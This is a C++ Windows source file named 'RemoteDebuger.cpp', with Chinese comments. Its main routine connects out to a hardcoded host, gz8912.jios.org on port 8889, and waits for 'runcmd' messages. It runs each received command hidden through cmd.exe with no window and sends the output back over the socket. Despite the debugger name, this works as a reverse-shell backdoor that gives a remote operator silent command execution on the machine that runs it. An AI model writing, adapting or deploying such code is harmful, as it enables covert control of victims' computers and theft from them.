// RemoteDebuger.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include <atlstr.h>
#include "RemoteDebuger.h"
#include "TcpSocket.h"
#include "..\公共\MemIni.h"

typedef struct tagSTD_INFO{
	HANDLE hPipeRead;
	CHAR chOutputBuffer[4096];
	DWORD dwOutputBufferLen;
	HANDLE hReadEvent;
	HANDLE hContineEvent;
	DWORD dwReadLen;
	BOOL  bBreak;
}STD_INFO,*PSTD_INFO;

DWORD WINAPI StdOutReadThread( PVOID pParam )
{
	PSTD_INFO pStdInfo = (PSTD_INFO)pParam;

	DWORD dwReadLen = 0;
	while ( FALSE == pStdInfo->bBreak )
	{
		WaitForSingleObject(pStdInfo->hContineEvent,INFINITE);

		if ( FALSE == ReadFile(pStdInfo->hPipeRead,pStdInfo->chOutputBuffer,pStdInfo->dwOutputBufferLen-1,&dwReadLen,NULL) )
		{
			break;
		}

		pStdInfo->dwReadLen = dwReadLen;
		SetEvent(pStdInfo->hReadEvent);
	}

	return 0;
}

typedef VOID (WINAPI *TypeMsgOutputCallBack)( PVOID pParam,LPCSTR pszOutputMsg );


VOID ExecCmdLine( LPCWSTR pszCmdLine ,TypeMsgOutputCallBack pCallback,PVOID pParam )
{

	HANDLE hPipeRead = NULL;
	HANDLE hPipeWrite = NULL;
	SECURITY_ATTRIBUTES saAttr; 
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
	saAttr.bInheritHandle = TRUE; 
	saAttr.lpSecurityDescriptor = NULL; 


	BOOL bPipeRes = CreatePipe(&hPipeRead,&hPipeWrite,&saAttr,4096);

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si,sizeof(si));
	ZeroMemory(&pi,sizeof(pi));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdOutput = hPipeWrite;
	//si.hStdInput = hPipeRead;
	si.hStdError = hPipeWrite;

	CString strCmdLine;
	strCmdLine.Format(L" /c %s",pszCmdLine);

	BOOL bRes = CreateProcessW(L"C:\\windows\\system32\\cmd.exe",strCmdLine.GetBuffer(),NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
	if (bRes)
	{
		STD_INFO *pStdInfo = new STD_INFO;
		pStdInfo->hPipeRead = hPipeRead;
		pStdInfo->dwOutputBufferLen = 4096;
		pStdInfo->hReadEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
		pStdInfo->hContineEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
		pStdInfo->bBreak = FALSE;

		HANDLE hReadThread = CreateThread(NULL,0,StdOutReadThread,pStdInfo,0,NULL);
		SetEvent(pStdInfo->hContineEvent);

		int nTimeOutCount = 0;


		while ( 1 )
		{

			DWORD dwWaitRes = WaitForSingleObject(pStdInfo->hReadEvent,100);
			if ( dwWaitRes != WAIT_OBJECT_0 )
			{
				nTimeOutCount++;

				if ( nTimeOutCount > 100 )
				{
					TerminateProcess(pi.hProcess,0);
				}
				//如果进程没有退出，则继续等待
				DWORD dwExitCode = 0;
				GetExitCodeProcess(pi.hProcess,&dwExitCode);
				if ( dwExitCode != STILL_ACTIVE )
				{
					break;
				}
			}
			else
			{
				pStdInfo->chOutputBuffer[pStdInfo->dwReadLen] = 0;

				/////////////////
				//处理输出的数据
				//OutputDebugStringA(pStdInfo->chOutputBuffer);
				//
				if (pCallback)
				{
					pCallback(pParam, pStdInfo->chOutputBuffer );
				}

				SetEvent(pStdInfo->hContineEvent);

			}
		}

		pStdInfo->bBreak = TRUE;
		SetEvent(pStdInfo->hContineEvent);
		bRes = CancelIoEx(hPipeRead,NULL);
		CloseHandle(hPipeRead);
		CloseHandle(hPipeWrite);
		WaitForSingleObject(hReadThread,INFINITE);
		CloseHandle(hReadThread);

		CloseHandle(pStdInfo->hContineEvent);
		CloseHandle(pStdInfo->hReadEvent);
		delete pStdInfo;

		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}

typedef struct tagOUTPUT_PARAM
{
	CTcpSocket *ptcpSock;
	HANDLE     hSource;
}OUTPUT_PARAM,*POUTPUT_PARAM;
VOID WINAPI MsgOutputCallBack( PVOID pParam,LPCSTR pszOutputMsg )
{
	POUTPUT_PARAM pOutputParam = (POUTPUT_PARAM)pParam;

	CTcpSocket *ptcpSock = pOutputParam->ptcpSock;
	if (ptcpSock)
	{
		CString strMsgOutput;
		strMsgOutput = pszOutputMsg;
		strMsgOutput.Replace(L"\r",L"\\r");
		strMsgOutput.Replace(L"\n",L"\\n");

		
		CMemIniFile IniResponse;
		IniResponse.WriteIniString( L"",L"cmd",L"runcmd");
		
		while ( strMsgOutput.GetLength() > 0 )
		{
			CString strTempMsgOutput;
			strTempMsgOutput = strMsgOutput.Left(128);
		
			strMsgOutput.Delete(0,128);

			IniResponse.WriteIniString( L"",L"result",strTempMsgOutput);
			IniResponse.WriteIniInt(L"",L"target",(int)pOutputParam->hSource);
			CString strResponseData;
			strResponseData = IniResponse.BuildData();

			//OutputDebugStringW(strResponseData+L"\r\n");

			int nSendRes = ptcpSock->SendData( (BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength()*sizeof(WCHAR) );
		}
	}

}



class CCSLock
{
private:
	CRITICAL_SECTION m_cs;
public:
	CCSLock()
	{
		InitializeCriticalSection(&m_cs);
	}
	~CCSLock()
	{
		DeleteCriticalSection(&m_cs);
	}
	VOID Lock()
	{
		EnterCriticalSection(&m_cs);
	}

	VOID UnLock()
	{
		LeaveCriticalSection(&m_cs);
	}

};

typedef struct tagRUN_CMD_PARAM
{
	CString strCmdData;
	CTcpSocket *ptcpSock;
	HANDLE hSource;
}RUN_CMD_PARAM,*PRUN_CMD_PARAM;

CCSLock csLock;
BOOL  bRunningCmd = FALSE;

DWORD WINAPI RunCmdThread( PVOID pParam )
{
	PRUN_CMD_PARAM pRunCmdParam = (PRUN_CMD_PARAM)pParam;

	csLock.Lock();
	bRunningCmd = TRUE;
	csLock.UnLock();


	OUTPUT_PARAM OutputParam;
	OutputParam.ptcpSock = pRunCmdParam->ptcpSock;
	OutputParam.hSource = pRunCmdParam->hSource;

	ExecCmdLine(pRunCmdParam->strCmdData,MsgOutputCallBack,&OutputParam);

	CMemIniFile IniResponse;
	IniResponse.WriteIniString( L"",L"cmd",L"runcmd");
	IniResponse.WriteIniString( L"",L"result",L"命令执行完成\r\n");
	IniResponse.WriteIniInt( L"",L"target",(int)pRunCmdParam->hSource);

	CString strResponseData;
	strResponseData = IniResponse.BuildData();

	OutputDebugStringW(strResponseData+L"\r\n");

	int nSendRes = pRunCmdParam->ptcpSock->SendData( (BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength()*sizeof(WCHAR) );

	delete pRunCmdParam;

	csLock.Lock();
	bRunningCmd = FALSE;
	csLock.UnLock();
	
	return 0;
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	CTcpSocket tcpSock;
	tcpSock.CreateTcpSocket();
	BOOL bConRes = tcpSock.Connect( "gz8912.jios.org",8889 );
	if (bConRes)
	{

		char chRecvDataBuffer[4096];
		while (TRUE)
		{
			int nRecvRes = tcpSock.RecvData(chRecvDataBuffer,4094);
			if (nRecvRes <= 0 )
			{
				break;
			}

			chRecvDataBuffer[nRecvRes] = 0;
			chRecvDataBuffer[nRecvRes+1] = 0;

			CMemIniFile Ini;
			Ini.ParseMemoryDataW((BYTE *)chRecvDataBuffer,nRecvRes);
			
			HANDLE hSource = (HANDLE)Ini.GetIniUint(L"",L"source",0);

			CString strCmd;
			strCmd = Ini.GetIniString(L"",L"cmd",L"");
			if (strCmd == L"runcmd")
			{
				BOOL bCanRunCmd = FALSE;
				csLock.Lock();
				bCanRunCmd = !bRunningCmd;
				csLock.UnLock();
				
				if (bCanRunCmd)
				{
					CString strCmdData;
					strCmdData = Ini.GetIniString(L"",L"data",L"");

					PRUN_CMD_PARAM pRunCmdParam = new RUN_CMD_PARAM;
					pRunCmdParam->hSource = hSource;
					pRunCmdParam->strCmdData = strCmdData;
					pRunCmdParam->ptcpSock = &tcpSock;

					HANDLE hRunCmdThread = CreateThread(NULL,0,RunCmdThread,pRunCmdParam,0,NULL);
				}
			}

			if (strCmd == L"heartbeat")
			{
				int nSendRes = tcpSock.SendData( (BYTE *)chRecvDataBuffer,nRecvRes );
			}
			Sleep(1);
		}

	}
	

	return (int) 0;
}